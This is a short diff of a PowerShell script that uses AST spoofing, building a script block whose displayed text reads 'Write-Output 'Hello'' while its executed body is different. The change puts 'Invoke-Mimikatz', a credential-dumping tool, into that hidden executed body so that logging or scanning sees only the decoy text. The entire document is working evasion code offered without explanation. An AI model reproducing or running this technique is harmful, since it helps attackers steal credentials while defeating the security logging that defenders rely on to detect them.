@@ -1,6 +1,6 @@
 ﻿$wc=New-Object System.Net.WebClient
 $SpoofedAst = [ScriptBlock]::Create("Write-Output 'Hello'").Ast  
-$ExecutedAst = [ScriptBlock]::Create("Write-Output 'World'").Ast
+$ExecutedAst = [ScriptBlock]::Create("Invoke-Mimikatz").Ast
 $Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.Extent,
                                                                    $null,
                                                                    $null,
@@ -10,5 +10,3 @@ $Ast = [System.Management.Automation.Language.ScriptBlockAst]::new($SpoofedAst.E
 $Sb = $Ast.GetScriptBlock()
 
 & $Sb
-
-Invoke-Mimikatz
